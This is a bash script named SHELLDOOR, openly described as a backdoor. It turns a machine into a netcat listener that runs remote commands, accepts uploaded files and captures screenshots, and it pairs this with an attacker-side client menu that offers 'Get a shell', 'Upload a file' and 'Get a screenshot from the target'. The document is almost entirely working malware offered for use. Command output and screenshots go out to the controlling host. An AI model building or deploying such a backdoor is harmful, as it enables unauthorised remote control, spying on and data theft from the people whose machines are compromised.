#!/bin/bash
# SHELLDOOR
# A simple backdoor written in Shell Script. Functions:
#
#     execute remote commands;
#     upload files;
#     take screenshots.
#
# Mateus-n00b, January 2016
#
# Version 1.0
#
# TODO:
# -Fix the function to get the ip "MYIP" variable.
# -Perform more tests.
# BUG:
# -At Debian distro you may need to press Ctrl+c to send every msg.
#
# License GPLv2


#  Global vars
TARGET=""
MYIP=$(/bin/ip addr show $int | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//' | tail -1)
FILE=""
ACK=""
PROMPT="\e[3;1m[n00b]$ "  # <- Insert your name here
ONOFF=""
CMD=""
#

usage(){
  echo \
  "Usage: $0 -t <target>
  -s          - Act as a target
  -h          - Print this message and exit

Examples of usage:
# run server
$ $0 -s

#After run the client
$ $0 -t 192.168.56.101
  "
  exit
}

# % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % %
#               SERVER SIDE
# % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % %

is_working(){
  sleep 5
  if [[ -z "$CMD" ]]; then
      ONOFF="EXIT"
  fi
  exit
}

send_ack(){
  nc "$TARGET" 2222 <<< 'ACK'
}

send_rep(){
    nc "$TARGET" 3333 <<< "$($CMD)"
}

as_a_server(){
  while [[ 1 ]]; do

      REQ=$(nc -l -p 2222)
      send_ack

      if grep "HI:" <<< "$REQ" &> /dev/null; then
         TARGET=$(cut -d':' -f2 <<< "$REQ")
        #  echo "[+] Received $TARGET"

      elif grep "SHELL" <<< "$REQ" &> /dev/null; then
          send_ack
          while [[ "$ONOFF" != "EXIT" ]]; do
                # Check if the client is sending cmds
                is_working &

                CMD=$(nc -l -p 2222)

                send_ack
        	      sleep 0.5
        	      send_rep &
                CMD=""
          done

      elif grep "UPL:" <<< "$REQ" &> /dev/null; then
            send_ack
            FILE=$(cut -d: -f2 <<< "$REQ")
            nc -l -p 2222 > "$FILE"
            send_ack
      elif grep "SHOT" <<< "$REQ" &> /dev/null; then
          send_ack

          import -window  root "img.jpg"
          gzip -f "img.jpg"
          nc "$TARGET" 2222 < "img.jpg.gz"
          continue
      fi

  done
}

# % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % %
#               CLIENT SIDE
# % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % %

upload(){
      FILE=$(zenity --file-selection)
      if [[ -z "$FILE" ]]; then
        echo "[-] Ivalid file!"
        exit 2

      else
          nc "$TARGET" 2222 <<< "UPL:$FILE"
          if check_ack
          then
                nc "$TARGET" 2222 < "$FILE"
                if check_ack
                then
                    echo "[+] File uploaded!"
                    exit
                else
                    echo "[-] Error to send file!"
                    exit
                fi
          fi

      fi
}

check_ack(){
    ACK=$(nc -l -p 2222 &)
    sleep 0.3
    if [ -z "$ACK" ]; then
      echo "[-] ACK not received! Check the endpoint."
      false

    fi
    # If everything is allright
    true
}

# The shell function
shell(){
      nc "$TARGET" 2222 <<< "SHELL"

      if check_ack
      then
          echo -e "\t\tHere's your shell. Enjoy it! Press Ctrl+C to exit"
          while [ 1 ]; do
                echo -ne "$PROMPT"
                read CMD

                sleep 0.5
                nc "$TARGET" 2222 <<< "$CMD"
                check_ack
		            nc -l -p 3333
          done
      else
          exit 2
      fi
}

# Play as an attacker
as_a_client(){
    nc "$TARGET" 2222 <<< "HI:$MYIP"
    if check_ack
    then
        echo "[+] Connected to $TARGET"

    else
        echo "[-] Error to connect to $TARGET!"
        exit
    fi

}

# Screenshot function
take_screenshot(){
    nc "$TARGET" 2222 <<< "SHOT"

    if check_ack
    then
        nc -l -p 2222 > "img.jpg.gz"
        echo "[+] Image received!"
        gzip -df "img.jpg.gz"
        exit
    else
      echo "[-] Error to request screenshot!"
      exit
    fi
}

# % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % %
#                             MAIN
# % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % % %

main(){
  echo '
  _________ ___ ______________.____    .____     ________   ________   ________ __________
/   _____//   |   \_   _____/|    |   |    |    \______ \  \_____  \  \_____  \\______   \
\_____  \/    ~    \    __)_ |    |   |    |     |    |  \  /   |   \  /   |   \|       _/
/        \    Y    /        \|    |___|    |___  |    `   \/    |    \/    |    \    |   \
/_______  /\___|_  /_______  /|_______ \_______ \/_______  /\_______  /\_______  /____|_  /
       \/       \/        \/         \/       \/        \/         \/         \/       \/
                                                          By n00b
  '

  while [ 1 ]; do
      as_a_client
      echo -ne \
"[1] Get a shell
[2] Upload a file
[3] Get a screenshot from the target
[4] Exit
$ "
       read choice

       case $choice in
           1)
              shell
            ;;

            2)
              upload
            ;;
            3)
              take_screenshot
            ;;
            4)
              echo "[!] Bye!"
            ;;
            *)
              echo "[-] Invalid entry!"
              exit 2
            ;;
       esac

  done
}


# Call the functions
[ $# -lt 1 ] && usage
while getopts hst: opt
do
	case $opt in
  	h)
  	 	usage
  	;;
	  s)
      as_a_server
  	;;
  	t)
  	   TARGET="$OPTARG"
       main

  	;;
    *)
      usage
    ;;
    esac
done
